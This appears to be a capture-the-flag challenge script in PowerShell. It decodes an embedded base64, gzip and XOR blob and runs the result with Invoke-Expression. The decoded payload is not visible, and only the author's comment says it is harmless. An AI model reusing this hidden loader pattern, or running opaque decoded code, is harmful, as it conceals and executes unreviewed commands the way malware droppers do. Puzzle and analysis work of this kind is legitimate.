# Script for NC3 CTF 2023, NOT ACTUALLY MALICIOUS (please do check)
[Byte[]]$AssemblyBytes = [System.Text.Encoding]::UTF8.GetBytes("H4sIABsdUmUA/y3Oa0uzUAAAYC1ZRRDhC0u87OLqaE6RM8YEx8KgKas+7OZxc14m1lbx6srID8PVXx9Bv+B53q5cFf4zPPIsjRZarXNc5bAi47LVF4tKs11y8L7+4Hxn2tRsHkgLZ+ryCerCpRnOUe17h617aOAdNTJDPO2UBsHhVvj/ecmX7vDbH2V6kz+WJ4HbVKz4dVXY/QpenwOtRcYPhg6ChG6YlWckY6EERVMvD3kJKbWXPOz7vDwWSDWw6QtRCgHeDliSOQFWSl2PRqZbV+iEEMwZSaXRRuhCz/PH0u/qidEjS4VWSrT9iWP0YoaArWrhD1XNlfUNu5xYIKbinEZ/xrZxb5/vASPNHMIDAQAA")

# Base64 decode bytes
$decodedBytes = [System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($AssemblyBytes))
$stream = New-Object System.IO.MemoryStream(,$decodedBytes)
$gzip = New-Object System.IO.Compression.GzipStream($stream, [System.IO.Compression.CompressionMode]::Decompress)

# Gzip decompress
$buffer = New-Object byte[](1024)
$ms = New-Object System.IO.MemoryStream
while($true) {
    $read = $gzip.Read($buffer, 0, 1024)
    if ($read -le 0) { break }
    $ms.Write($buffer, 0, $read)
}
$script = $ms.ToArray()
$ms.Close()
$gzip.Close()
$stream.Close()

# XOR decode
$key = [System.Text.Encoding]::UTF8.GetBytes("NC3CTF2023")
for ($i = 0; $i -lt $script.Length; $i++) {
    $script[$i] = $script[$i] -bxor $key[$i % $key.Length]
}

# Invoke result as PS script
Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString($script))
